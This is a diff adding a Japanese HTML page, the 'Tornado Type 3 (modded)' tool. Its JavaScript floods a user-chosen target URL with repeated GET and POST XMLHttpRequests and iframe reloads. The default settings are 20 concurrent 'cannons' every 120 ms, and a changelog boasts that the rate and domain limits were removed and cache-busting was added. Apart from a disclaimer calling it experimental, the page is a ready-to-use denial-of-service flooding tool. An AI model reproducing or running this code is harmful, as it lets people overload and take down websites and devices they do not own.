@@ -1,0 +1,135 @@
+<html>
+<head>
+<meta http-equiv="content-type">
+<meta http-equiv="content-style-type" content="text/css">
+<title>トルネード三式(modded)</title>
+<script language="JavaScript">
+
+	var m_toDoing;
+	var m_stBomburl;
+	var m_inInterval = 0;
+	var m_inCount = 0;
+	var m_ifFrame = new Array();
+	var method="POST";
+	var method2="GET";
+	var async="true"
+	var postdata="Iloveyou";
+	var xhr = new XMLHttpRequest();
+	var xhr2 = new XMLHttpRequest();
+	function main()
+	{
+		m_inInterval = document.m_form1.m_tbInterval.value;
+		m_inWinNum = document.m_form1.m_tbWinNum.value;
+		m_stBomburl = document.m_form1.m_tbUrl.value;
+
+		for(i = 0; i < m_ifFrame.length; i++)
+		{
+			try
+			{
+				document.all.m_dvMado.removeChild(m_ifFrame[i]);
+			}
+			catch(e){}
+		}
+
+		if(m_stBomburl[i] == "")
+		{
+			//空
+		}
+		else if(m_inInterval < 2)
+		{
+			alert("更新間隔が短すぎます。");
+		}
+		else
+		{
+			for(i = 0; i < m_inWinNum; i++)
+			{
+				m_ifFrame[i] = document.createElement('iframe');
+				m_ifFrame[i].setAttribute("id", "frame" + i);
+				m_ifFrame[i].setAttribute("height", "120");
+				m_ifFrame[i].setAttribute("width", "640");
+				document.all.m_dvMado.appendChild(m_ifFrame[i]);
+			}
+			m_inCount = 0;
+			m_toDoing = setTimeout("goBomb()", m_inInterval);
+		}
+	}
+
+	function goBomb()
+	{
+		var bomb;
+        
+		for(i = 0; i < m_inWinNum; i++)
+		{
+			bomb = m_stBomburl;
+			xhr2.open(method2, bomb, async);
+	    	xhr2.setRequestHeader("Pragma", "no-cache");
+ 			xhr2.setRequestHeader("Cache-Control", "no-cache");
+ 			xhr2.setRequestHeader("If-Modified-Since", "Thu, 01 Jun 1970 00:00:00 GMT");
+ 			xhr2.send();
+			m_ifFrame[i].setAttribute("src", bomb);
+            //XMLHttpRequest
+			xhr.open(method, bomb, async);
+			xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+			xhr.send(postdata);
+
+		}
+		bombCounter();
+		m_toDoing = setTimeout("goBomb()", m_inInterval);
+	}
+
+	function stopBomb()
+	{
+		clearTimeout(m_toDoing);
+		document.all.m_taInfo.value += "\n\n";
+		document.all.m_taInfo.value += "～訪問を中止しました～";
+	}
+
+	function bombCounter()
+	{
+		var stInfoTmp;
+		m_inCount++;
+		stInfoTmp = "～訪問しています～\n";
+		stInfoTmp += "回数　：" + m_inCount + "回\n";
+		stInfoTmp += "速度　：" + m_inInterval + "ms\n";
+		stInfoTmp += "砲門数：" + m_inWinNum + "門\n";
+		stInfoTmp += m_stBomburl;
+		document.all.m_taInfo.value = stInfoTmp;
+	}
+//-->
+</script>
+
+</head>
+
+<body>
+
+<h1>ﾈ申【トルネード三式・乙】風(moded)</h1>
+<b>2006.07.23版</b><br>
+本品は実験用のツールです。これを悪用して起こったいかなる損害にも、当方は責任を負いかねます。<br>
+<b>[追記 2022/12/05]</b> <br>更新間隔制限解除&ドメイン制限解除&XMLHttpRequest_GET/POST追加&キャッシュ無効化<br>
+
+<b>[重要]</b> <br>Chrome以外では上手く作動しない可能性があります。
+<br>更新間隔などの数値は既定値が最良です。うまく行かない場合は変えてください。</br>
+
+<br>
+<form name="m_form1">
+【対象】<br>
+<input type="text" name="m_tbUrl" size=60 value="http://192.168.11.1"><br>
+<br>
+【更新間隔】（1/1000秒　2秒ごとの場合 2000に）<br>
+<input type="text" size="10" name="m_tbInterval" value="120"><br>
+<br>
+【同時更新数】（窓数）<br>
+<input type="text" size="10" name="m_tbWinNum" value="20"><br>
+<br>
+<input type="button" value="開始" onclick="main();"><input type="button" value="中止" onclick="stopBomb();"> <br>
+<br>
+【情報】<br>
+<textarea id="m_taInfo" style="border:1px solid #000000;height:100px;width:80%;">※ここに情報が表示されます。</textarea>
+</form>
+<div id="m_dvMado">
+　
+</div>
+</body>
+
+</html>
+
